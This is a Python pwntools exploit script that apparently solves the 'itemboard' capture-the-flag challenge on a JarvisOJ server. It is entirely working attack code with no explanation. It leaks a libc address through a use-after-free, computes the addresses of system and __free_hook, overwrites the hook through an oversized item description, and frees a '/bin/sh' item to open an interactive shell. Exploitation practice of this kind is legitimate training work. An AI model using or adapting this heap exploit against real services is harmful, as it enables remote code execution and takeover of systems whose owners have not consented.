#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

Io = remote("pwn2.jarvisoj.com", 9887)
#Io = process('./itemboard')
bin = ELF('./itemboard')
libc = ELF('./libc-2.19.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def new_item(name, length, content):
    Io.recvuntil('choose:')
    Io.sendline('1')
    Io.recvuntil('Item name?')
    Io.sendline(name)
    Io.recvuntil('len?')
    Io.sendline(str(length))
    Io.recvuntil('Description?')
    Io.sendline(content)
def show_item(num):
    Io.recvuntil('choose:')
    Io.sendline('3')
    Io.recvuntil('Which item?')
    Io.sendline(str(num))
    Io.recvuntil('Description:')
def remove_item(num):
    Io.recvuntil('choose:')
    Io.sendline('4')
    Io.recvuntil('Which item?')
    Io.sendline(str(num))

#------------------leak libc_base----------------
new_item('0',0x80,'A')
new_item('1',0x80,'B')
remove_item(0)

show_item(0)
leak_data = u64(Io.recv(6).ljust(8,'\x00'))
libc_base = leak_data - 0x3BE7B8
free_hook_ptr = libc_base + 0x3BDEE8
#libc_base = data-0x3c4b78
#free_hook_ptr = libc_base + 0x3C3EF8
system_addr = libc_base + libc.symbols['system']
success("libc_base: " + hex(libc_base))
success("free_hook_ptr: " + hex(free_hook_ptr))
success("system: " + hex(system_addr))

#------------------hijack & write------------------
payload = p64(system_addr)
payload += 'a'*(1024 + 8-len(payload))
payload += p64(free_hook_ptr-8)

new_item('/bin/sh\x00',len(payload),payload)
remove_item(2)

Io.interactive()